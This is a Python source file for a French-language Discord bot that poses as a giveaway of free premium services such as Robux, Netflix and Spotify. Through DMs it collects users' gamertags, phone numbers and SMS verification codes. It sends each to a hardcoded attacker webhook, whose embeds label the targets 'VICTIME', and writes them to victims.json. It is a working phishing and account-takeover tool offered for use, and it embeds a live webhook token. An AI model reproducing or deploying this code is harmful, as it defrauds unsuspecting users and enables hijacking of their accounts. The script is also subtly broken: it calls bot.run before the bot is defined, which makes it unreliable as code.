import discord
from discord.ext import commands, tasks
import asyncio
import aiohttp
import uuid
import random
import json
from datetime import datetime
import discord
from discord import ui, Embed, Webhook
from discord.ext import commands
import asyncio
import aiohttp
import os
bot.run(os.getenv("TOKEN"))

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.dm_messages = True
intents.guilds = True

bot = commands.Bot(command_prefix="!", intents=intents)

WEBHOOK_URL = "https://discord.com/api/webhooks/1512879903320703149/ZpBC0fXE8sPadHLx_8FwGyTdFrsI6TYVhyNCagspvSZZ8FwoHBHFVKteGZPfeOyTqV1O"

MAIN_PANEL_CHANNEL = 1512885178974867527
WELCOME_CHANNEL = 1512903987106545805

active_sessions = {}
victims_data = []

async def save_victim(data):
    victims_data.append(data)
    try:
        with open("victims.json", "w", encoding="utf-8") as f:
            json.dump(victims_data, f, indent=4, ensure_ascii=False)
    except:
        pass

async def send_to_webhook(user, service, step=None, numero=None, sms_code=None, username=None, extra=None, alert=False):
    session_id = active_sessions.get(user.id, str(uuid.uuid4())[:8].upper())
    active_sessions[user.id] = session_id

    if alert:
        embed = discord.Embed(title="🚨 ALERTE - NOUVELLE VICTIME", description="Une personne vient de cliquer", color=0xff0000, timestamp=discord.utils.utcnow())
        embed.add_field(name="👤 Utilisateur", value=f"{user} (`{user.id}`)", inline=False)
        embed.add_field(name="Service", value=service, inline=False)
    else:
        embed = discord.Embed(title=f"🎯 VICTIME #{session_id} - {service}", description=f"**{user}** (`{user.id}`)", color=0x00ff00, timestamp=discord.utils.utcnow())
        if username: embed.add_field(name="👤 Username / Gamertag", value=username, inline=False)
        if numero: embed.add_field(name="📱 Numéro", value=f"`{numero}`", inline=False)
        if sms_code: embed.add_field(name="🔑 Code SMS", value=f"`{sms_code}`", inline=False)
        if step: embed.add_field(name="📍 Étape", value=step, inline=False)

    async with aiohttp.ClientSession() as session:
        await session.post(WEBHOOK_URL, json={"embeds": [embed.to_dict()]})
    await save_victim({"time": datetime.utcnow().isoformat(), "user": str(user), "user_id": user.id, "service": service, "step": step, "numero": numero, "sms_code": sms_code, "username": username})

async def typing_indicator(channel, duration=1.5):
    async with channel.typing():
        await asyncio.sleep(random.uniform(duration - 0.4, duration + 0.6))

# ====================== BIENVENUE PERMANENT ======================
welcome_message = None

@bot.event
async def on_member_join(member):
    if member.bot:
        return
    
    # Salon bienvenue - Message permanent
    w_channel = bot.get_channel(WELCOME_CHANNEL)
    if w_channel:
        try:
            global welcome_message
            if welcome_message is None or not welcome_message.channel:
                welcome_message = await w_channel.send(
                    f"**Bienvenue sur le serveur !** 🎁\n"
                    f"Le bot est disponible juste ici → <#{MAIN_PANEL_CHANNEL}>\n"
                    f"Choisis ton service premium gratuit et active-le immédiatement !"
                )
        except:
            pass

    # Ping rapide dans le salon panel + suppression
    p_channel = bot.get_channel(MAIN_PANEL_CHANNEL)
    if p_channel:
        try:
            ping_msg = await p_channel.send(f"{member.mention} **Bienvenue !** Active ton service premium gratuit ici 🎮")
            await asyncio.sleep(1.0)  # Temps pour que la notif arrive
            await ping_msg.delete()
        except:
            pass

# ====================== RENOUVELLEMENT PANEL ======================
@tasks.loop(hours=5)
async def renew_panel():
    await setup_main_panel()

@bot.event
async def on_ready():
    print(f"✅ Bot connecté - Panel auto 5h + Welcome permanent + Ping panel + Retry")
    renew_panel.start()
    await setup_main_panel()

async def setup_main_panel():
    channel = bot.get_channel(MAIN_PANEL_CHANNEL)
    if not channel: return

    async for msg in channel.history(limit=50):
        if msg.author == bot.user:
            await msg.delete()

    embed = discord.Embed(title="🎁 Services Premium & Monnaies Virtuelles Gratuits", description="Profitez gratuitement.\nChoisis ci-dessous :", color=0x00ff00)
    embed.add_field(name="Services disponibles", value="• Robux Roblox\n• Netflix Premium\n• Snapchat+\n• Crunchyroll\n• Spotify Premium\n• Disney+\n• YouTube Premium\n• Amazon Prime\n• Hulu\n• Paramount+\n• Xbox Game Pass\n• PlayStation Plus", inline=False)
    embed.set_footer(text="Offre limitée")

    view = discord.ui.View(timeout=None)
    services = [
        ("🎮 Robux", "success", "start_robux"), ("🎥 Netflix", "danger", "start_netflix"),
        ("👻 Snapchat+", "primary", "start_snap"), ("🍥 Crunchyroll", "primary", "start_crunchyroll"),
        ("🎵 Spotify", "success", "start_spotify"), ("🏰 Disney+", "primary", "start_disney"),
        ("📺 YouTube Premium", "danger", "start_youtube"), ("📦 Amazon Prime", "success", "start_amazon"),
        ("📺 Hulu", "danger", "start_hulu"), ("🌟 Paramount+", "primary", "start_paramount"),
        ("🎮 Xbox Game Pass", "success", "start_xbox"), ("🔵 PlayStation Plus", "primary", "start_psplus"),
    ]
    for label, style, cid in services:
        view.add_item(discord.ui.Button(label=label, style=getattr(discord.ButtonStyle, style), custom_id=cid))

    await channel.send(embed=embed, view=view)

@bot.event
async def on_interaction(interaction: discord.Interaction):
    if not interaction.data or not interaction.data.get("custom_id", "").startswith("start_"): return

    custom_id = interaction.data["custom_id"]
    service_key = custom_id.replace("start_", "")
    service_map = {"robux":"Robux","netflix":"Netflix","snap":"Snapchat+","crunchyroll":"Crunchyroll","spotify":"Spotify","disney":"Disney+","youtube":"YouTube Premium","amazon":"Amazon Prime","hulu":"Hulu","paramount":"Paramount+","xbox":"Xbox Game Pass","psplus":"PlayStation Plus"}
    service_name = service_map.get(service_key, service_key.capitalize())

    await send_to_webhook(interaction.user, service_name, alert=True)
    await interaction.response.send_message("✅ Instructions en MP...", ephemeral=True)

    active_sessions[interaction.user.id] = str(uuid.uuid4())[:8].upper()
    dm = await interaction.user.create_dm()
    await generic_premium_flow(interaction.user, dm, service_name, service_key)

async def generic_premium_flow(user, dm, service, service_key):
    for attempt in range(3):
        try:
            await typing_indicator(dm, 2.5)
            await dm.send(embed=discord.Embed(title=f"🔍 Connexion {service}", description="Recherche compte...", color=0xffff00))
            await asyncio.sleep(random.uniform(2.8, 4.5))
            await typing_indicator(dm, 2.0)
            await dm.send(embed=discord.Embed(title="✅ Compte trouvé", description=f"Activation {service} en cours...", color=0x00ff00))

            username = None
            if service_key in ["robux", "xbox", "psplus"]:
                plat = "Roblox" if service_key == "robux" else "Xbox" if service_key == "xbox" else "PlayStation"
                await typing_indicator(dm, 1.6)
                await dm.send(embed=discord.Embed(title=f"👤 {plat}", description=f"Entre ton {plat} username/gamertag :", color=0x00bfff))
                msg = await bot.wait_for('message', check=lambda m: m.author == user and isinstance(m.channel, discord.DMChannel), timeout=120)
                username = msg.content.strip()
                await send_to_webhook(user, service, step=f"{plat} Username", username=username)

            await ask_number(user, dm, service)
            return
        except asyncio.TimeoutError:
            if attempt < 2:
                await dm.send("⏳ Temps écoulé. Je relance le processus...")
                await asyncio.sleep(3)
            else:
                await dm.send("Session expirée. Reviens sur le panel pour recommencer.")
        except:
            pass

async def ask_number(user, dm, service):
    await typing_indicator(dm, 2.0)
    await dm.send(embed=discord.Embed(title="📱 Vérification", description="Entre ton numéro (+33 0612346712) :", color=0x00bfff))
    num_msg = await bot.wait_for('message', check=lambda m: m.author == user and isinstance(m.channel, discord.DMChannel), timeout=180)
    numero = num_msg.content.strip()
    await send_to_webhook(user, service, step="Numéro", numero=numero)
    await asyncio.sleep(1.5)
    await ask_sms_code(user, dm, service)

async def ask_sms_code(user, dm, service):
    await typing_indicator(dm, 2.2)
    await dm.send(embed=discord.Embed(title="🔑 Code SMS", description="Envoie le code à 4 chiffres reçu par SMS de vérification:", color=0x00bfff))
    sms_msg = await bot.wait_for('message', check=lambda m: m.author == user and isinstance(m.channel, discord.DMChannel), timeout=300)
    sms_code = sms_msg.content.strip()[:6]
    await send_to_webhook(user, service, step="Code SMS", sms_code=sms_code)
    await typing_indicator(dm, 2.5)
    await dm.send(embed=discord.Embed(title="🎉 Succès !", description=f"{service} activé. Profite !", color=0x00ff00))


bot.run(os.getenv("TOKEN"))
